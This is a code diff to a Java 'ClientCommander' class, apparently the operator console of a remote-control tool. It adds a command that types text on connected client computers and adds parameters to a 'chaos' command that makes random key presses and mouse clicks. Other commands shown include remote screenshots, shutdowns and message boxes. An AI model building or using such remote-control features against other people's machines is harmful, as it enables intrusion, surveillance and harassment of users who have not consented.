@@ -62,7 +62,7 @@ public class ClientCommander implements Runnable
     private boolean commandValid(String command)
     {
         command = command.toLowerCase();
-        return command.equals("chaos") || command.equals("help") || command.equals("count") || command.equals("online") || command.equals("eject") || command.equals("sound") || command.equals("shutdown") || command.equals("restart") || command.equals("screenshot") || command.equals("msg");
+        return command.equals("type") || command.equals("chaos") || command.equals("help") || command.equals("count") || command.equals("online") || command.equals("eject") || command.equals("sound") || command.equals("shutdown") || command.equals("restart") || command.equals("screenshot") || command.equals("msg");
     }
 
     /**
@@ -94,7 +94,7 @@ public class ClientCommander implements Runnable
     private void printHelp(String command)
     {
         if(command == null) // user wants full help
-            System.out.println("count\nonline\nhelp\neject HOST\nshutdown HOST\nrestart HOST\nscreenshot HOST\nsound HOST /path/to/local/sound/file\nmsg HOST \"message body\" \"message title\" type\n\nHOST can either be a specified IP address or the word all (to send to every online client)");
+            System.out.println("count\nonline\nhelp\neject HOST\nshutdown HOST\nrestart HOST\nscreenshot HOST\nsound HOST /path/to/local/sound/file\nmsg HOST \"message body\" \"message title\" type\nchaos HOST DURATION DELAY\ntype HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
         else
         {
             if(command.equals("count"))
@@ -114,7 +114,9 @@ public class ClientCommander implements Runnable
             else if(command.equals("msg"))
                 System.out.println("msg will send a message that will be displayed as a message box on the clients computer.\nExample usage:\n\tmsg 127.0.0.1 \"message body\" \"title of the message box\" type\ntype can be any of the following: error, info, warning");
             else if(command.equals("chaos"))
-                System.out.println("chaos will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\tchaos 127.0.0.1");
+                System.out.println("chaos will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\tchaos 127.0.0.1 DURATION DELAY\nDURATION is the time in ms for the chaos to last\nDELAY is the time in ms between each random act of chaos");
+            else if(command.equals("type"))
+                System.out.println("type will type the provided message on the clients computer.\nExample usage:\n\ttype 127.0.0.1 \"this is will get typed out\"");
         }
     }
 
@@ -176,7 +178,7 @@ public class ClientCommander implements Runnable
         if(!host.equals("all"))
             target.sendCommand(command); // send the cmd to the specified connected client
 
-        // Two argument commands: sound
+        // Two argument commands: sound, type
         // e.g. sound 127.0.0.1 /path/to/sound/file
         String argument = null;
         if(commandTokens.size() == 3)
